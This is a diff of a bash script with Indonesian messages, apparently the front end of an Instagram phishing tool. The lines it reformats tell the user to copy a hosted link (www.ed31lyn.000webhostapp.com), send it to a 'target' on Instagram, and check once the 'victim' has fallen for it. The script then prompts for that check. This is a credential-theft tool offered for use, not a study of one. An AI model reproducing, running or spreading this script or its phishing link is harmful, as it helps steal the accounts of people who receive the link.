@@ -28,14 +28,12 @@ if [[ $response != *pre* ]]; then
     echo
     echo "Website Offline sementara"
 else
-    echo                          "trik penggunaan"
-    echo "
-    sleep 0.04                     "watch & learn"
-    echo                  "1.Copy link disamping : www.ed31lyn.000webhostapp.com"
-    echo                  "2.Kirim link yang sudah di copy ke target(hanya untuk instagram)"
-    echo                  "3.Jika korban sudah terkena bisa langsung di cek"
-    echo                  "4.asshiap"
-    echo 
+    echo "trik penggunaan"
+    echo "watch & learn"
+    echo "1.Copy link disamping : www.ed31lyn.000webhostapp.com"
+    echo "2.Kirim link yang sudah di copy ke target(hanya untuk instagram)"
+    echo "3.Jika korban sudah terkena bisa langsung di cek"
+    echo "4.asshiap"
     echo "Ingin melakukan pengecekan?"
     echo "y/n?"
     read pengecekan
